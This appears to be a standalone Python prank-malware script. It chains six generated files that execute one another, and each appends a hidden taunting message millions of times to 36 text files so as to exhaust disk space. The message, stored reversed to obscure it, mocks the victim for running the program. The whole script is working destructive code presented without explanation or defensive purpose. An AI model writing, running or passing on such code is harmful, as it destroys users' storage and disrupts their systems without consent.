holyNum = 1
while holyNum < 7:
    text_file = open("name{}.py".format(holyNum), "a")
    text_file.write("""letters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u",
           "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
num = a = 0
hey = ['.', '.', 'e', 'l', 'b', 'a', 'r', 'e', 's', 'i', 'm', ' ', 's', "'", 't', 'a', 'h', 't', ' ', ',', 'w', 'o',
       'n', ' ', 't', 'i', ' ', 'd', 'e', 'c', 'i', 't', 'o', 'n', ' ', 'u', 'o', 'y', ' ', 'd', 'n', 'A', ' ', '.',
       't', 'o', 'i', 'd', 'i', ' ', ',', 'e', 'm', ' ', 'g', 'n', 'i', 'n', 'n', 'u', 'r', ' ', 'r', 'o', 'f', ' ',
       's', 'k', 'n', 'a', 'h', 't', ' ', ',', 'e', 'v', 'i', 'r', 'D', ' ', 'd', 'r', 'a', 'H', ' ', 'd', 'n', 'a',
       ' ', 'M', 'A', 'R', ' ', 'r', 'u', 'o', 'y', ' ', 'g', 'n', 'i', 'k', 'c', 'u', 'f', ' ', 'm', "'", 'I']
tek = "."
for i in hey:
    tek = tek + i
tek = tek[::-1]
while num < 5:
    for i in letters:
        text_file = open("{}.txt".format(i), "a")
        while a < 1000000:
            text_file.write(tek)
            a += 1
        a = 0
    num += 1\n
""")
    if holyNum < 6:
        text_file.write("""exec(open("name{}.py").read())""".format(holyNum + 1))
    holyNum += 1
exec(open("name1.py").read())
